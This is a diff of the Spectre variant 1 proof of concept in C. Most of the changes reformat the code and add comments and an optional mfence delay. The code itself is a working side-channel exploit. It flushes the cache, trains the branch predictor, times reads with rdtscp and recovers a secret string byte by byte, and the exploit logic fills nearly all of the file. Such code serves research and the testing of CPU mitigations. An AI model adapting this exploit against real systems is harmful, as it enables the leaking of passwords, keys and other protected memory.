@@ -46,8 +46,7 @@ uint8_t array1[160] = {
 };
 uint8_t unused2[64];
 uint8_t array2[256 * 512];
-
-char * secret = "The Magic Words are Squeamish Ossifrage.";
+char *secret = "The Magic Words are Squeamish Ossifrage.";
 
 uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */
 
@@ -82,51 +81,57 @@ void flush_memory_sse(uint8_t * addr)
 #endif
 
 /* Report best guess in value[0] and runner-up in value[1] */
-void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2], int score[2]) {
+void readMemoryByte(int cache_hit_threshold, size_t malicious_x,
+                    uint8_t value[2], int score[2]) {
   static int results[256];
   int tries, i, j, k, mix_i, junk = 0;
   size_t training_x, x;
   register uint64_t time1, time2;
-  volatile uint8_t * addr;
+  volatile uint8_t *addr;
 
 #ifdef NOCLFLUSH
   int junk2 = 0;
   int l;
 #endif
 
+  // Clear results:
   for (i = 0; i < 256; i++)
     results[i] = 0;
-  for (tries = 999; tries > 0; tries--) {
 
+  // Repeat attack 1k times:
+  for (tries = 999; tries > 0; tries--) {
 #ifndef NOCLFLUSH
     /* Flush array2[256*(0..255)] from cache */
     for (i = 0; i < 256; i++)
-      _mm_clflush( & array2[i * 512]); /* intrinsic for clflush instruction */
+      _mm_clflush( &array2[i*512] ); /* intrinsic for clflush instruction */
 #else
     /* Flush array2[256*(0..255)] from cache
        using long SSE instruction several times */
     for (j = 0; j < 16; j++)
       for (i = 0; i < 256; i++)
-        flush_memory_sse( & array2[i * 512]);
+        flush_memory_sse( &array2[i*512] );
 #endif
 
     /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
     training_x = tries % array1_size;
     for (j = 29; j >= 0; j--) {
 #ifndef NOCLFLUSH
-      _mm_clflush( & array1_size);
+      _mm_clflush( &array1_size );
 #else
       /* Alternative to using clflush to flush the CPU cache */
       /* Read addresses at 4096-byte intervals out of a large array.
          Do this around 2000 times, or more depending on CPU cache size. */
-
       for(l = CACHE_FLUSH_ITERATIONS * CACHE_FLUSH_STRIDE - 1; l >= 0; l-= CACHE_FLUSH_STRIDE) {
         junk2 = cache_flush_array[l];
       } 
 #endif
 
       /* Delay (can also mfence) */
+#ifndef NOMFENCE
+      _mm_mfence();
+#else
       for (volatile int z = 0; z < 100; z++) {}
+#endif
 
       /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
       /* Avoid jumps in case those tip off the branch predictor */
@@ -136,7 +141,6 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
 
       /* Call the victim! */
       victim_function(x);
-
     }
 
     /* Time reads. Order is lightly mixed up to prevent stride prediction */
@@ -151,13 +155,11 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
     The best way to do this is to use the rdtscp instruction, which measures current
     processor ticks, and is also serialized.
     */
-
 #ifndef NORDTSCP
-      time1 = __rdtscp( & junk); /* READ TIMER */
-      junk = * addr; /* MEMORY ACCESS TO TIME */
-      time2 = __rdtscp( & junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
+      time1 = __rdtscp(&junk); /* READ TIMER */
+      junk = *addr; /* MEMORY ACCESS TO TIME */
+      time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
 #else
-
     /*
     The rdtscp instruction was instroduced with the x86-64 extensions.
     Many older 32-bit processors won't support this, so we need to use
@@ -223,14 +225,12 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
 *  2: Malicious address start (size_t)
 *  3: Malicious address count (int)
 */
-int main(int argc,
-  const char * * argv) {
-  
+int main(int argc, const char *argv[]) {
   /* Default to a cache hit threshold of 80 */
   int cache_hit_threshold = 80;
 
   /* Default for malicious_x is the secret string address */
-  size_t malicious_x = (size_t)(secret - (char * ) array1);
+  size_t malicious_x = (size_t)(secret - (char *)array1);
   
   /* Default addresses to read is 40 (which is the length of the secret string) */
   int len = 40;
@@ -246,7 +246,7 @@ int main(int argc,
   #endif
   
   for (i = 0; i < sizeof(array2); i++) {
-    array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
+    array2[i] = 1; /* write to array2 to initialize pages */
   }
 
   /* Parse the cache_hit_threshold from the first command line argument.
@@ -291,7 +291,6 @@ int main(int argc,
   #else
     printf("CLFLUSH_NOT_SUPPORTED ");
   #endif
-
   printf("\n");
 
   printf("Reading %d bytes:\n", len);
@@ -309,13 +308,11 @@ int main(int argc,
     /* Display the results */
     printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
     printf("0x%02X=’%c’ score=%d ", value[0],
-      (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
-    
+           (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
     if (score[1] > 0) {
       printf("(second best: 0x%02X=’%c’ score=%d)", value[1],
-      (value[1] > 31 && value[1] < 127 ? value[1] : '?'), score[1]);
+             (value[1] > 31 && value[1] < 127 ? value[1] : '?'), score[1]);
     }
-
     printf("\n");
   }
   return (0);
